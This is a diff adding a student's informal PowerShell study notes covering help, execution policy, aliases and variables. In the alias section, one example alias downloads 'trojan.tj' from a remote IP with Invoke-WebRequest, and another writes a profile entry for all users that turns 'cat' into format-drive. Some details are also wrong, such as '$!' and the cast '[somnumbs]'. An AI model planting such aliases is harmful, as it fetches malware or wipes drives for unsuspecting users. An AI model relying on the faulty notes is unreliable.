@@ -1,0 +1,106 @@
+comments in powershell are # same as normal
+a multi line comment starts with <# and ends with #>
+
+a hearstring is a block of code that starts with @' and ends with '@, useful for running group of commands as a variable
+
+home and end buttons take you to the start and end of the line, ctrl+ arrow key to go word by word on a line
+docs.microsoft.com most helpful for looking up commands online
+________________________________________________
+
+get-executionpolicy to find execution policy on device, most of the time will be restrcited so as to not delete c:\
+
+set-execution policy 
+Set-ExecutionPolicy -ExecutionPolicy Restricted -scope CurrentUser
+
+
+update-"command" to update that command to the newest available according to the microsoft database
+update-help -force -erroraction silentlycontinue to update our help pages without showing errors 
+
+when using get-help if you see square brackets those are values you can set yourself, 
+squigly braces means options for the command itself, (ie, for get-help set-executionpolicy the options are bypass, default, remote signed etc cetera
+anything in <> is a string you can add to the cmdlet
+
+to find examples of cmdlets or code use -examples option 
+to bring up a help file on machine use -showwindow option but -online is better because most times showwindow will be outof date
+
+get-help *tasks*
+get-help task
+
+
+get-command -verb or -noun or -name
+
+helpfiles start with about_ in powershell (ie, get-help about_)
+
+
+first positional parameter is -path in get-childitem 
+common parameter like -name look at the object and try to get that attribute so for a parameter -name it will look at the text in -name because every object in powershell has a name
+
+
+Get-ChildItem -path C:\ -filter *.evil -Recurse -Name (looks through the C directory to find all files ending in .evil recursively)
+get-childitem alias:ls (finds alias for that specific command or alias entered, for us ls stands for get-childitem)
+when looking at stackoverflow if a variable or thing does not make sense run get-alias "command" to find the alias
+most powershell programmers are good with aliases and you arent dumbass
+
+to create alias do New-Alias -name "dora" -value explorter.exe
+
+new-alias -name honse -value 'Invoke-webRequest 0.4.7.7:6000:trojan.tj'
+set-alias -name honse -value 'Invoke-webRequest 0.4.7.7:6000:trojan.tj' using set-alias allows for you to overwrite existing aliases where as new-alias would error out if it recognizes a previous alias was using what we wanted
+
+to make an alias permanent we need to go to $profile (our powershell profile) 
+add-content -path $profile.allusersallhosts -value "set-alias -name cat -value format-drive" 
+
+
+
+VARIABLES
+___________________________________________________________________________________________________________
+
+
+$money = 'all of it' = declaration
+
+$money = call
+
+output = all of it
+
+$money.GetType() = string
+
+$somenumbs = 40
+$somenumbs.GetType() = int32
+
+typecasting
+
+([somnumbs]$somenumbs).GetType() = somenumbs is now a string for right now
+[float]
+[byte]
+[char]
+[int]
+[datetime]2022/xx/xx
+
+$$ = last token
+$! = execution status of last command, True == successful False == unsuccessful execution
+$_ = current object in current pipeline
+$args = array of arguments passed undeclared parameters
+$input = enumeration of all parameter passed to a function
+$null = variable of nothing
+$true = is this true 
+$false = is this false
+$profile = path to the powershell profiles
+
+
+
+$services = $(Get-Service)
+get-childitem variable:* or variable:name
+get-childitem $env:
+
+
+
+``````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````````
+ACTIVITIES
+ACTIVITY 1
+1) update-help -force -erroraction silentlycontinue
+2) get-process
+3)get-service
+4) write-host or echo
+5)set-variable, get-variable get-childitem variable:*
+6)
+7) read-input 
+
